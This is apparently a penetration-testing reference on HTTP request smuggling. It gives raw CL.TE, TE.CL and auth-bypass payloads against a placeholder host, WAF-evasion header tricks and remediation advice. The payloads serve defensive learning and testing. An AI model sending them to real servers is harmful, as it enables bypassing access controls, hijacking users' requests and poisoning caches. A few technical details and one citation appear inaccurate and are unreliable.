# HTTP Request Smuggling

> Front-end and back-end servers disagree on where one HTTP request ends and the next begins. Authorized testing only. Map: PortSwigger Web Security Academy (HTTP Desync Attacks), CWE-444 Inconsistent Interpretation of HTTP Requests.

## TL;DR
- Smuggling exists when a proxy/CDN and the origin parse `Content-Length` and `Transfer-Encoding: chunked` differently.
- Four canonical patterns: **CL.TE** (frontend uses CL, backend uses TE), **TE.CL** (inverse), **TE.TE** (both use TE but parse differently when obfuscated), and (HTTP/2 era) **H2.CL** / **H2.TE** where HTTP/2 frontend downgrades to HTTP/1.1 backend and length is computed from frame metadata.
- Newer (2023): **CL.0** / **0.CL** — front-end accepts a body, back-end ignores it (or vice versa), enabling smuggling without TE at all. James Kettle's "browser-powered desync" research.
- Impact: bypass front-end ACLs (auth, WAF rules), hijack other users' requests, cache-poisoning across all users behind the cache.
- Defence: end-to-end HTTP/2, no downgrade; consistent parser between front-end and back-end; explicit `400` on ambiguous request framing.

## Detection / Discovery

### Smuggle-or-not test (PortSwigger Burp HTTP Request Smuggler extension)
- Sends timing-sensitive payloads; differential response time confirms desync.
- Automated CL.TE / TE.CL / H2.CL / H2.TE probes.

### Manual smoke test — CL.TE probe
Send a request with both `Content-Length` and `Transfer-Encoding: chunked`:
```
POST / HTTP/1.1
Host: target.tld
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
If the front-end honors CL (reads 6 bytes: `0\r\n\r\nG`) and the back-end honors TE (sees the `0` terminator, then `G` is the start of the *next* request) → desync.

The "next request" prefix `G` will be prepended to the *next* legitimate user's request. You see this by sending the smuggled request, then immediately sending another request that the front-end pipelines to the back-end — the back-end glues `G` to the front of it and emits a 4xx with the malformed verb in the response.

### TE.CL probe
```
POST / HTTP/1.1
Host: target.tld
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: target.tld
Content-Length: 15

x=1
0

```
Front-end honors TE (full chunked body); back-end honors CL=4 (reads only `5e\r\n`), then sees `POST /admin` as a new request.

### H2.CL / H2.TE
HTTP/2 to the front-end, HTTP/1.1 downgrade to the back-end. The H2 framing carries length implicitly; the front-end synthesises a CL/TE header for the back-end. If `:content-length` in H2 disagrees with the body length, or attacker injects a `Transfer-Encoding: chunked` H2 pseudoheader → desync.

### 0.CL / CL.0
Front-end ignores body on `GET`-like methods but back-end reads it (or vice versa). PortSwigger's 2023 research showed many WAF→origin chains had this on `GET` and `OPTIONS` requests.

## Exploitation

### Stealing cookies / hijacking sessions
Smuggle a request whose response will be glued onto the next user's request:
```
POST / HTTP/1.1
Host: target.tld
Content-Length: 130
Transfer-Encoding: chunked

0

GET /maintain-cache HTTP/1.1
Host: target.tld
X-Smuggled: smuggled

```
When the next user's request hits the back-end, the back-end thinks the user sent `GET /maintain-cache` with the smuggled headers. Output goes back to the user (or to the cache, poisoning everyone).

### Bypassing front-end auth
Front-end ACL: "no one can GET `/admin` unless they have a session cookie". Back-end has no such rule. Smuggle:
```
POST /api/echo HTTP/1.1
Host: target.tld
Content-Length: 0
Transfer-Encoding: chunked

54
GET /admin HTTP/1.1
Host: target.tld
Foo: bar
0

```
The back-end processes `GET /admin` without ever passing through the front-end ACL.

### Cache poisoning
A poisoned cache key (front-end caches based on URL) + smuggled request that responds with malicious content → every subsequent user gets the malicious response until cache expiry.

## Bypasses
- WAF strips `Transfer-Encoding` → obfuscate: `Transfer-Encoding: \t chunked`, `Transfer-Encoding: chunked\r\nX-Foo: bar`, dual header injection.
- WAF blocks `0\r\n\r\n` chunked terminator → send `\n\n` instead (some parsers accept).
- Smuggling research: every new HTTP server release closes some variants; James Kettle's research repeatedly finds new ones. Always test fresh against the *deployed* stack.

## Defence / Remediation
- **End-to-end HTTP/2** — no HTTP/1.1 hop. Most smuggling requires the CL/TE split that H2 doesn't expose.
- **Reject ambiguous framing**: both `Content-Length` and `Transfer-Encoding: chunked` present → `400 Bad Request`. RFC 9112 Section 6.3 mandates this.
- **Strict parser** at both layers — same library, same version, where possible. Use a maintained, hardened proxy (nginx ≥ 1.21, HAProxy ≥ 2.x with `h1-strict` mode).
- **Disable connection reuse** between front-end and back-end (per-request connections). Smuggling needs reuse to "leak" smuggled bytes into the next request.
- **Block 0.CL / CL.0** by sending the body even for GET/HEAD/OPTIONS, or by enforcing no body on these methods.
- **Internal request logging** at the back-end with the *exact* bytes received; alert on impossible verbs and on the second-request prefix pattern (`G`/`GP`/`POS` at the start of a malformed log line).
- **PortSwigger Burp HTTP Request Smuggler** in pen test suite; **smuggler.py** (defparam) for command-line CI smoke tests.

## Sources
- PortSwigger — HTTP request smuggling: https://portswigger.net/web-security/request-smuggling
- James Kettle — "HTTP Desync Attacks" (DEF CON / Black Hat): https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- James Kettle — "HTTP/2: The Sequel is Always Worse" (2021): https://portswigger.net/research/http2
- James Kettle — "Smashing the State Machine" (2023, 0.CL/CL.0): https://portswigger.net/research/smashing-the-state-machine
- Burp HTTP Request Smuggler extension: https://github.com/PortSwigger/http-request-smuggler
- smuggler.py (defparam): https://github.com/defparam/smuggler
- RFC 9112 (HTTP/1.1 message syntax): https://datatracker.ietf.org/doc/html/rfc9112
- CWE-444 Inconsistent Interpretation of HTTP Requests: https://cwe.mitre.org/data/definitions/444.html
- HackTricks request smuggling: https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
